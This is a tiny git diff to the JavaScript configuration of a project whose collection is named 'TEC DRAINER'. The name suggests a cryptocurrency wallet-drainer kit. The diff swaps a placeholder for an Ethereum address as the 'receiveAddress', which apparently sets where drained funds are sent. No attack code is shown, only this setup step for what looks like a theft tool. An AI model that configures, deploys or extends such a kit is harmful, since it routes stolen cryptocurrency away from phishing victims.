@@ -1,4 +1,4 @@
-const receiveAddress = "Your ETH Wallet Adress";
+const receiveAddress = "Y0x7d8Ac1a2806f8670fB0c643Dc732488d3cDC6dC4";
 
 const collectionInfo = {
     name: "TEC DRAINER",
